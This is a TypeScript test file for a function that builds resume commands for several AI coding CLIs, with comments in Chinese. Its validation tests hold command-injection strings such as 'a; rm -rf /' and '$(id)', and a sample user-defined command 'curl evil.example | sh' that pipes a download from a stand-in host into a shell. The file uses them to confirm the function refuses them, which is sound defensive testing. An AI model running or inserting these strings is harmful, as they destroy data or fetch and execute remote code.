import assert from 'node:assert/strict';
import { test } from 'node:test';
import { DEFAULT_CLI_DEFINITIONS, resumeArgv, type CliDefinition } from '../src/registry.ts';

const byId = (id: string) => DEFAULT_CLI_DEFINITIONS.find(d => d.id === id);

test('each CLI resumes the way it actually documents, not a shared guess', () => {
  assert.deepEqual(resumeArgv(byId('claude'), 'abc-123'), ['claude', '--resume', 'abc-123']);
  assert.deepEqual(resumeArgv(byId('codex'), 'abc-123'), ['codex', 'resume', 'abc-123']);
  assert.deepEqual(resumeArgv(byId('omp'), 'abc-123'), ['omp', '-r', 'abc-123']);
  assert.deepEqual(resumeArgv(byId('qwen'), 'abc-123'), ['qwen', '--resume', 'abc-123']);
  assert.deepEqual(resumeArgv(byId('grok'), 'abc-123'), ['grok', '--resume', 'abc-123']);
  // opencode 用的是 -s，不是 --resume。这类差别就是「不能拿一个配方套所有人」的理由。
  assert.deepEqual(resumeArgv(byId('opencode'), 'ses_f762ec887ffe7b'), ['opencode', '-s', 'ses_f762ec887ffe7b']);
});

/*
  gemini 的 --resume 收的是**序号**（或 "latest"），不是会话 ID，而序号会随着删除会话
  漂移。给它套一个 `--resume <id>` 会静默恢复到**另一条对话**——那比不恢复糟得多。
*/
test('a CLI whose resume we do not know is refused, not guessed', () => {
  assert.equal(resumeArgv(byId('gemini'), 'abc-123'), null);
});

/*
  这个 ID 会成为一条要执行的命令的一部分。白名单比转义可靠——再仔细的引号也可能被
  某一层 shell 解开一次，而「压根不接受」不会。
*/
test('a session id that is not plainly an id is refused', () => {
  const claude = byId('claude');
  for (const bad of ["a; rm -rf /", "$(id)", "`id`", "a b", "a'b", 'a"b', "a\nb", "a|b", "a&b", "../x", "", "x".repeat(129)]) {
    assert.equal(resumeArgv(claude, bad), null, `accepted ${JSON.stringify(bad)}`);
  }
  // 各家真实用的形状必须全部通过。
  for (const good of ["550e8400-e29b-41d4-a716-446655440000", "ses_f762ec887ffe7bxnH7gbOlGQU7", "abc.def:ghi_jkl"]) {
    assert.ok(resumeArgv(claude, good), `refused ${good}`);
  }
});

/*
  用户自定义的 CLI 可以填任意 command。从那里拼一条要执行的 argv 出来，等于把执行权
  交给了配置文件。内置定义才有恢复配方。
*/
test('a user-defined CLI never yields a command to run', () => {
  const custom: CliDefinition = {
    id: 'mine', name: 'Mine', command: 'curl evil.example | sh', rules: [],
    iconRef: null, builtin: false, enabled: true, priority: 0,
    resume: { args: ['--resume', '{id}'] },
  };
  assert.equal(resumeArgv(custom, 'abc-123'), null);
  assert.equal(resumeArgv(undefined, 'abc-123'), null);
});

/*
  cli_configs 存的是一张冻住的 definition 快照。老库里的内置条目没有 resume 字段——
  而那正是装了很久、最该能恢复的那些人。配方要按 id 从代码里取回来。
*/
test('a stored definition from before resume existed still resumes, keeping the user command', () => {
  const stale = { ...byId('claude')!, command: 'claude-code' } as CliDefinition;
  delete (stale as { resume?: unknown }).resume;
  assert.deepEqual(resumeArgv(stale, 'abc-123'), ['claude-code', '--resume', 'abc-123']);
});
